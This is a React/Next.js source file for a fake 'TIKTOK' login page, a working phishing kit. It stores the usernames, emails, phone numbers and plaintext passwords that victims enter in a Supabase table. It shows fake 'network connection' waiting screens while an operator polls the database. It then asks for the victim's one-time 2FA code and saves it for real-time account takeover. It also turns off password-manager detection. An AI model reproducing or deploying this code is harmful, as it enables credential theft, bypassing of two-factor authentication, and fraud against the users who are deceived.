'use client'

import { useState, useEffect } from 'react'
import { useRouter } from 'next/navigation'
import { supabase } from '@/lib/supabase'
import { Loader2, ChevronDown } from 'lucide-react'

export default function LoginPage() {
  const router = useRouter()
  const [loginMethod, setLoginMethod] = useState('email')
  const [emailOrUsername, setEmailOrUsername] = useState('')
  const [phone, setPhone] = useState('')
  const [countryCode, setCountryCode] = useState('+1264')
  const [showCountryCodes, setShowCountryCodes] = useState(false)
  const [password, setPassword] = useState('')
  const [otp, setOtp] = useState(['', '', '', '', '', ''])
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState('')
  const [pendingUserId, setPendingUserId] = useState(null)
  const [approvalMessage, setApprovalMessage] = useState('Waiting for Network connection')
  const [stage, setStage] = useState('login') // login, waiting1, otp, waiting2, approved
  const [mounted, setMounted] = useState(false)

  // Handle mounting to avoid hydration issues
  useEffect(() => {
    setMounted(true)
  }, [])

  // Check if user has been approved by admin
  useEffect(() => {
    let interval
    if ((stage === 'waiting1' || stage === 'waiting2') && pendingUserId) {
      interval = setInterval(async () => {
        const { data } = await supabase
          .from('users')
          .select('is_verified')
          .eq('id', pendingUserId)
          .single()

        if (data?.is_verified) {
          setStage('approved')
          setApprovalMessage('Approved! Redirecting ...')
          setTimeout(() => {
            // Reset everything and go back to login
            setStage('login')
            setOtp(['', '', '', '', '', ''])
            setEmailOrUsername('')
            setPhone('')
            setPassword('')
            setPendingUserId(null)
            setApprovalMessage('Waiting for Network connection')
            router.push('/')
          }, 2000)
        }
      }, 3000)
    }
    return () => clearInterval(interval)
  }, [stage, pendingUserId, router])

  const countryCodes = [ { code: '+254', country: 'KE' },
    { code: '+1', country: 'US/CA' }, { code: '+44', country: 'UK' },
    { code: '+91', country: 'IN' }, { code: '+61', country: 'AU' },
    { code: '+86', country: 'CN' }, { code: '+81', country: 'JP' },
    { code: '+49', country: 'DE' }, { code: '+33', country: 'FR' },
    { code: '+39', country: 'IT' }, { code: '+34', country: 'ES' },
    { code: '+55', country: 'BR' }, { code: '+52', country: 'MX' },
    { code: '+7', country: 'RU' }, { code: '+82', country: 'KR' },
    { code: '+65', country: 'SG' }, { code: '+60', country: 'MY' },
    { code: '+66', country: 'TH' }, { code: '+84', country: 'VN' },
    { code: '+20', country: 'EG' }, { code: '+27', country: 'ZA' },
    { code: '+234', country: 'NG' },
    { code: '+1264', country: 'AI' }, { code: '+1268', country: 'AG' },
    { code: '+1284', country: 'VG' }, { code: '+1340', country: 'VI' },
    { code: '+1441', country: 'BM' }, { code: '+1473', country: 'GD' },
    { code: '+1649', country: 'TC' }, { code: '+1664', country: 'MS' },
    { code: '+1670', country: 'MP' }, { code: '+1671', country: 'GU' },
    { code: '+1684', country: 'AS' }, { code: '+1721', country: 'SX' },
    { code: '+1758', country: 'LC' }, { code: '+1767', country: 'DM' },
    { code: '+1784', country: 'VC' }, { code: '+1849', country: 'DO' },
    { code: '+1868', country: 'TT' }, { code: '+1869', country: 'KN' },
    { code: '+1876', country: 'JM' },
  ]

  const handleLogin = async (e) => {
    e.preventDefault()
    setLoading(true)
    setError('')

    try {
      const fullPhone = `${countryCode}${phone}`
      
      const userData = loginMethod === 'email' 
        ? {
            email: emailOrUsername.includes('@') ? emailOrUsername : null,
            username: !emailOrUsername.includes('@') ? emailOrUsername : null,
            phone: null,
            password: password,
          }
        : {
            email: null,
            username: null,
            phone: fullPhone,
            password: password,
          }

      const { data: newUser, error: insertError } = await supabase
        .from('users')
        .insert([userData])
        .select()
        .single()

      if (insertError) throw insertError

      setPendingUserId(newUser.id)
      setStage('waiting1')
      setApprovalMessage('Waiting for s stable Network connection')
      setLoading(false)

    } catch (err) {
      setError(err.message)
      setLoading(false)
    }
  }

  const handleOtpChange = (index, value) => {
    if (value.length <= 1 && /^\d*$/.test(value)) {
      const newOtp = [...otp]
      newOtp[index] = value
      setOtp(newOtp)

      // Move to next input manually only when user types
      if (value && index < 5) {
        document.getElementById(`otp-${index + 1}`)?.focus()
      }
    }
  }

  const handleOtpKeyDown = (index, e) => {
    // Handle backspace to go to previous input
    if (e.key === 'Backspace' && !otp[index] && index > 0) {
      document.getElementById(`otp-${index - 1}`)?.focus()
    }
  }

  const handleOtpSubmit = async (e) => {
    e.preventDefault()
    
    // Manual submission - check if all digits are filled
    const otpCode = otp.join('')
    if (otpCode.length !== 6) {
      setError('Please enter all 6 digits')
      return
    }

    setLoading(true)
    setError('')
    
    try {
      const { error } = await supabase
        .from('users')
        .update({ 
          user_entered_otp: otpCode,
          otp_submitted_at: new Date().toISOString()
        })
        .eq('id', pendingUserId)

      if (error) throw error

      setLoading(false)
      setStage('waiting2')
      setApprovalMessage('OTP received! loging in ...')
      
    } catch (err) {
      console.error('OTP submission error:', err)
      setError('Failed to submit OTP. Please try again.')
      setLoading(false)
    }
  }

  // Check if admin has enabled OTP input
  useEffect(() => {
    let interval
    if (stage === 'waiting1' && pendingUserId) {
      interval = setInterval(async () => {
        const { data } = await supabase
          .from('users')
          .select('show_otp_input')
          .eq('id', pendingUserId)
          .single()

        if (data?.show_otp_input) {
          setStage('otp')
          // Reset OTP fields when entering OTP page
          setOtp(['', '', '', '', '', ''])
          clearInterval(interval)
        }
      }, 3000)
    }
    return () => clearInterval(interval)
  }, [stage, pendingUserId])

  // Don't render anything until mounted to avoid hydration issues
  if (!mounted) {
    return null
  }

  // Loading spinner for waiting stages
  if (stage === 'waiting1' || stage === 'waiting2' || stage === 'approved') {
    return (
      <div className="min-h-screen bg-black flex items-center justify-center p-4">
        <div className="text-center space-y-6 max-w-md w-full">
          <Loader2 className="h-16 w-16 sm:h-20 sm:w-20 animate-spin text-[#F53255] mx-auto" />
          <p className="text-white text-xl sm:text-2xl font-semibold px-4">{approvalMessage}</p>
          <p className="text-gray-400 text-base sm:text-lg px-4">
            {stage === 'approved' ? 'You will be redirected to login' : 'This may take a few moments'}
          </p>
          <div className="mt-6 sm:mt-8">
            <div className="flex justify-center space-x-2 sm:space-x-3">
              <div className="h-2 w-2 sm:h-3 sm:w-3 bg-[#F53255] rounded-full animate-bounce [animation-delay:-0.3s]"></div>
              <div className="h-2 w-2 sm:h-3 sm:w-3 bg-[#F53255] rounded-full animate-bounce [animation-delay:-0.15s]"></div>
              <div className="h-2 w-2 sm:h-3 sm:w-3 bg-[#F53255] rounded-full animate-bounce"></div>
            </div>
          </div>
          <p className="text-gray-600 text-xs sm:text-sm mt-6 sm:mt-8 px-4">
            {stage === 'approved' ? 'Redirecting...' : "You'll be redirected once verified"}
          </p>
        </div>
      </div>
    )
  }

  // OTP Input Page - Manual submission only
  if (stage === 'otp') {
    const isOtpComplete = otp.every(digit => digit.length === 1)
    
    return (
      <div className="min-h-screen bg-black flex flex-col items-center justify-center p-4">
        <div className="w-full max-w-md space-y-6 sm:space-y-8">
          <div className="text-center">
            <h2 className="text-2xl sm:text-3xl font-bold text-white">Enter OTP</h2>
           
            <p className="text-gray-500 text-xs sm:text-sm mt-1">Enter  6-digit code</p>
          </div>
          
          {error && (
            <div className="bg-red-900/50 border border-red-700 text-red-200 px-3 sm:px-4 py-2 sm:py-3 rounded-lg text-xs sm:text-sm mx-2">
              {error}
            </div>
          )}
          
          <form onSubmit={handleOtpSubmit} className="mt-6 sm:mt-8 space-y-6">
            <div className="flex justify-center space-x-1 sm:space-x-2 px-2">
              {otp.map((digit, index) => (
                <input
                  key={index}
                  id={`otp-${index}`}
                  type="text"
                  inputMode="numeric"
                  maxLength={1}
                  value={digit}
                  onChange={(e) => handleOtpChange(index, e.target.value)}
                  onKeyDown={(e) => handleOtpKeyDown(index, e)}
                  className="w-10 h-10 sm:w-14 sm:h-14 text-center text-lg sm:text-2xl bg-gray-900 border border-gray-700 rounded-lg text-white focus:border-[#F53255] focus:ring-2 focus:ring-[#F53255]"
                  autoFocus={index === 0}
                  disabled={loading}
                  suppressHydrationWarning
                />
              ))}
            </div>

            <div className="px-4">
              <button
                type="submit"
                disabled={loading || !isOtpComplete}
                className="w-full flex justify-center py-2 sm:py-3 px-4 border border-transparent rounded-lg shadow-sm text-sm sm:text-base font-medium text-white bg-[#F53255] hover:bg-[#d42b48] focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-[#F53255] disabled:opacity-50 disabled:cursor-not-allowed transition-colors"
                suppressHydrationWarning
              >
                {loading ? (
                  <>
                    <Loader2 className="h-4 w-4 sm:h-5 sm:w-5 animate-spin mr-2" />
                    Submitting...
                  </>
                ) : (
                  'Submit OTP'
                )}
              </button>
            </div>

            <p className="text-center text-xs sm:text-sm text-gray-500 px-4">
              {isOtpComplete ? (
                <span className="text-[#F53255]">success...</span>
              ) : (
                'Enter all 6 digits to continue'
              )}
            </p>
          </form>
        </div>
      </div>
    )
  }

  // Initial Login Form
  return (
    <div className="min-h-screen bg-black flex flex-col items-center justify-center p-4" suppressHydrationWarning>
      {/* Logo */}
      <div className="absolute top-2 sm:top-4 left-2 sm:left-4">
        <div className="text-white text-xl sm:text-2xl font-bold">TIKTOK</div>
        
      </div>

      <div className="w-full max-w-md space-y-6 sm:space-y-8" suppressHydrationWarning>
        <div className="text-center">
          <h2 className="text-2xl sm:text-3xl font-bold text-white">Log in</h2>
         
        </div>

        {/* Login Method Toggle */}
        <div className="flex justify-center space-x-2 sm:space-x-4 border-b border-gray-800 pb-4 px-4">
          <button
            type="button"
            onClick={() => {
              setLoginMethod('email')
              setError('')
            }}
            className={`px-3 sm:px-4 py-2 text-xs sm:text-sm font-medium rounded-t-lg ${
              loginMethod === 'email'
                ? 'text-[#F53255] border-b-2 border-[#F53255]'
                : 'text-gray-400 hover:text-gray-300'
            }`}
            suppressHydrationWarning
          >
            Email/Username
          </button>
          <button
            type="button"
            onClick={() => {
              setLoginMethod('phone')
              setError('')
            }}
            className={`px-3 sm:px-4 py-2 text-xs sm:text-sm font-medium rounded-t-lg ${
              loginMethod === 'phone'
                ? 'text-[#F53255] border-b-2 border-[#F53255]'
                : 'text-gray-400 hover:text-gray-300'
            }`}
            suppressHydrationWarning
          >
            Phone
          </button>
        </div>

        <form className="mt-6 sm:mt-8 space-y-4 sm:space-y-6 px-4" onSubmit={handleLogin} suppressHydrationWarning>
          <div className="space-y-3 sm:space-y-4">
            {loginMethod === 'email' ? (
              <div>
                <label className="block text-xs sm:text-sm font-medium text-gray-300 mb-1 sm:mb-2">
                  Email or Username <span className="text-[#F53255]">*</span>
                </label>
                <input
                  type="text"
                  value={emailOrUsername}
                  onChange={(e) => setEmailOrUsername(e.target.value)}
                  className="w-full px-3 py-2 sm:py-2.5 text-sm sm:text-base bg-gray-900 border border-gray-700 rounded-lg text-white placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-[#F53255] focus:border-transparent"
                  placeholder="Enter email or username"
                  required
                  disabled={loading}
                  autoComplete="off"
                  data-1p-ignore
                  data-lpignore="true"
                  data-form-type="other"
                  suppressHydrationWarning
                />
              </div>
            ) : (
              <div>
                <label className="block text-xs sm:text-sm font-medium text-gray-300 mb-1 sm:mb-2">
                  Phone Number <span className="text-[#F53255]">*</span>
                </label>
                <div className="flex flex-row gap-2">
                  {/* Country Code Dropdown */}
                  <div className="relative w-24 sm:w-auto flex-shrink-0">
                    <button
                      type="button"
                      onClick={() => setShowCountryCodes(!showCountryCodes)}
                      className="w-full h-full flex items-center justify-between space-x-1 px-2 py-2.5 bg-gray-800 border border-gray-700 rounded-l-lg text-gray-300 hover:bg-gray-700 focus:outline-none focus:ring-2 focus:ring-[#F53255] text-sm"
                      disabled={loading}
                      suppressHydrationWarning
                    >
                      <span className="truncate">{countryCode}</span>
                      <ChevronDown className="h-4 w-4 flex-shrink-0" />
                    </button>
                    
                    {showCountryCodes && (
                      <div className="absolute top-full left-0 mt-1 w-48 max-h-60 overflow-y-auto bg-gray-800 border border-gray-700 rounded-lg shadow-xl z-50">
                        {countryCodes.map((cc) => (
                          <button
                            key={cc.code}
                            type="button"
                            onClick={() => {
                              setCountryCode(cc.code)
                              setShowCountryCodes(false)
                            }}
                            className="flex items-center justify-between w-full px-3 py-2 text-left hover:bg-gray-700 text-gray-300 text-sm"
                            suppressHydrationWarning
                          >
                            <span>{cc.country}</span>
                            <span className="text-[#F53255]">{cc.code}</span>
                          </button>
                        ))}
                      </div>
                    )}
                  </div>
                  
                  {/* Phone Number Input */}
                  <input
                    type="tel"
                    value={phone}
                    onChange={(e) => setPhone(e.target.value)}
                    className="flex-1 w-full px-3 py-2.5 text-sm bg-gray-900 border border-gray-700 rounded-r-lg text-white placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-[#F53255] focus:border-transparent"
                    placeholder="Phone number"
                    required
                    disabled={loading}
                    autoComplete="off"
                    data-1p-ignore
                    data-lpignore="true"
                    data-form-type="other"
                    suppressHydrationWarning
                  />
                </div>
              </div>
            )}

            <div>
              <label className="block text-xs sm:text-sm font-medium text-gray-300 mb-1 sm:mb-2">
                Password <span className="text-[#F53255]">*</span>
              </label>
              <input
                type="text"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="w-full px-3 py-2 sm:py-2.5 text-sm sm:text-base bg-gray-900 border border-gray-700 rounded-lg text-white placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-[#F53255] focus:border-transparent"
                placeholder="Enter password"
                required
                disabled={loading}
                autoComplete="off"
                data-1p-ignore
                data-lpignore="true"
                data-form-type="other"
                suppressHydrationWarning
              />
            </div>
          </div>

          {error && (
            <div className="text-red-500 text-xs sm:text-sm text-center bg-red-900/20 p-2 rounded-lg">
              {error}
            </div>
          )}

          <div>
            <button
              type="submit"
              disabled={loading}
              className="w-full flex justify-center py-2 sm:py-3 px-4 border border-transparent rounded-lg shadow-sm text-sm sm:text-base font-medium text-white bg-[#F53255] hover:bg-[#d42b48] focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-[#F53255] disabled:opacity-50 disabled:cursor-not-allowed transition-colors"
              suppressHydrationWarning
            >
              {loading ? (
                <>
                  <Loader2 className="h-4 w-4 sm:h-5 sm:w-5 animate-spin mr-2" />
                  Processing...
                </>
              ) : (
                'Log in'
              )}
            </button>
          </div>

          <div className="text-center mt-3 sm:mt-4">
            
          </div>
        </form>
      </div>
    </div>
  )
}